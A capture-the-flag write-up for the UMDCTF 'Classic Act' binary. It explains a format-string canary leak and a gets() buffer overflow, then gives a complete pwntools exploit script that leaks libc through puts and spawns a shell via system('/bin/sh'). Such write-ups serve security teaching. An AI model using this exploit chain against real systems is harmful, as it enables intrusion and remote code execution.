# Classic Act

## Challenge

The challenge first asks for our name, which it repeats to us.
It then asks for a second input, then prints one of two responses based on the input.

```
Please enter your name!
AAA
Hello:
AAA
What would you like to do today?
BBB
Good luck doing that!
```

### Decompiled code

```c
uint64_t sym.vuln(void) {
    int32_t iVar1;
    uint64_t uVar2;
    int64_t in_FS_OFFSET;
    int64_t var_68h;
    char *format;
    char *s1;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    sym.imp.puts("Please enter your name!");
    sym.imp.gets(&format);
    sym.imp.puts("Hello:");
    sym.imp.printf(&format);
    sym.imp.putchar(10);
    sym.imp.puts("What would you like to do today?");
    sym.imp.gets(&s1);
    iVar1 = sym.imp.strncmp(&s1, "Play in UMDCTF!", 0xf);
    if (iVar1 != 0) {
        sym.imp.puts("Good luck doing that!");
    }
    else {
        sym.imp.puts("You have come to the right place!");
    }
    uVar2 = (uint64_t)(iVar1 != 0);
    if (var_8h != *(int64_t *)(in_FS_OFFSET + 0x28)) {
        uVar2 = sym.imp.__stack_chk_fail();
    }
    return uVar2;
}
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

There is a format string vulnerability in the code used to echo the user's name.
The challenge uses `printf` directly on user input to repeat the name.
This allows us to leak values from the stack, such as the canary, using conversion specifiers.

```
Please enter your name!
%19$p
Hello:
0x5c7d54174b43c600
What would you like to do today?
```

There is a buffer overflow vulnerability in the next input, as the challenge uses `gets` which does
not check the length of our input.
We can use this to perform a ret2libc attack.

First, we can leak the libc version by calling `puts` with different GOT entries as the argument.
This allows us to leak the addresses of libc versions.
The last 12 bits of each address can be used to determine the libc version in a libc database.

Note that this challenge uses a less common version of libc and may not be present in some
databases.

Now we can leak the base address of libc using the a known function address and a GOT entry.
Afterwards, we return to `main` so we can send a second payload to spawn a shell.
The second input simply calls `system("/bin/sh")` using the leaked addresses.
This will spawn a shell and allow us to read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.cloud.chals.io --port 10058 classicact
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('classicact')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.cloud.chals.io'
port = int(args.PORT or 10058)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = None

if args.LOCAL:
    libc = ELF('/usr/lib/libc.so.6')
else:
    libc = ELF('libc6_2.31-0ubuntu9.7_amd64.so')

io = start()

io.sendlineafter(b"Please enter your name!\n", "%{}$p".format((0x70-0x8) // 8 + 6).encode())
io.recvuntil(b"Hello:\n")

canary = int(io.recvuntil(b"\n", drop=True), 0)
io.success("Canary: {}".format(hex(canary)))

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.call(exe.sym['main'])
print(rop.dump())
io.sendlineafter(b"What would you like to do today?\n", flat({
    0x50-0x8: canary,
    0x50+0x8: rop.chain(),
    }))
io.recvuntil(b"Good luck doing that!\n")

puts = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00'))
io.info("puts: {}".format(hex(puts)))

libc.address = puts - libc.sym['puts']
io.success("Libc: {}".format(hex(libc.address)))

io.sendlineafter(b"Please enter your name!\n", b"a")
rop = ROP(exe)
rop.raw(rop.ret)
rop.call(libc.sym['system'], [next(libc.search(b"/bin/sh"))])
print(rop.dump())
io.sendlineafter(b"What would you like to do today?\n", flat({
    0x50-0x8: canary,
    0x50+0x8: rop.chain(),
    }))

io.interactive()
```

## Flag

```
UMDCTF{H3r3_W3_G0_AgAIn_an0thEr_RET2LIBC}
```
